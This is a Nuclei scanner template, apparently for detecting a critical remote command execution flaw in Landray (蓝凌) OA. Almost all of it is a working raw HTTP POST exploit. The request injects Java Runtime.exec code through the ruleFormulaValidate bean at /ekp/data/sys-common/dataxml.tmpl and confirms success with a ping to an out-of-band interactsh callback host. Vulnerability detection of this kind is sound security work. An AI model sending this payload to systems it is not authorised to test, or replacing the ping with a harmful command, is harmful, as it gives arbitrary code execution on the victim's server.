id: lanling-rce

info:
  name: 蓝凌OA远程命令执行
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for a remote command execution vulnerability in 蓝凌OA by sending a crafted payload.
    The payload triggers a ping to an interactsh URL to verify the vulnerability.
  tags: rce,lanling,oa,critical

http:
  - raw:
      - |
        POST /ekp/data/sys-common/dataxml.tmpl HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 192

        s_bean=ruleFormulaValidate&script=try {
        String cmd = "ping {{interactsh-url}}";
        Process child = Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
        System.err.println(e);
        }

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: interactsh_request
        words:
          - "ping"
